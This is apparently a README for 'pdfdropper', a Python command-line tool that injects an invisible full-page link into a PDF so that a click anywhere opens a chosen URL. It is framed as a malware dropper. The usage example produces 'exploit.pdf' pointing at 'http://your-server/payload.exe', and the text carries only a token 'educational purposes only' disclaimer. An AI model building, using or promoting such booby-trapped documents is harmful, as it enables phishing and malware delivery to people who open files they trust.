

# Universal PDF Dropper: Full-Page Link Injection for Modern Browsers

*For educational purposes only.* 🔒

Inject a full-page, invisible link into any PDF so that clicking anywhere in the document opens your chosen URL—no Acrobat-only JavaScript required.

## 🚀 Features
- **Full-Page Injection**: Invisible `/URI` annotation across the entire page.
- **Cross-Viewer Support**: Compatible with Chrome, Firefox, Preview, Acrobat, etc.
- **Pure Python**: Uses `pypdf`, no JS or Acrobat plugins.
- **CLI**: Quick one-liner to craft your dropper.

## 📋 Prerequisites
- Python 3.6+
- `venv` or `virtualenv`
- A safe base PDF (`original.pdf`)

## 🛠️ Installation
```bash
git clone https://github.com/harze12/pdfdropper.git
cd pdfdropper
python3 -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate.ps1
pip install -r requirements.txt
cp /path/to/your.pdf original.pdf
```


## 🔧 Usage

Run the CLI tool with the following options:

-f: Path to the input PDF (e.g., original.pdf).

-o: Path for the output PDF (e.g., exploit.pdf).

-url: The target URL to inject (e.g., http://your-server/payload.exe).


```bash
python pdfdropper.py -f original.pdf -o exploit.pdf -url http://your-server/payload.exe
```

## Example

Inject a full-page link into report.pdf that points to https://example.com:

```bash
python pdfdropper.py -f report.pdf -o report_linked.pdf -url https://example.com
```

Open *-linked.pdf in any PDF viewer—click anywhere to navigate to your URL.

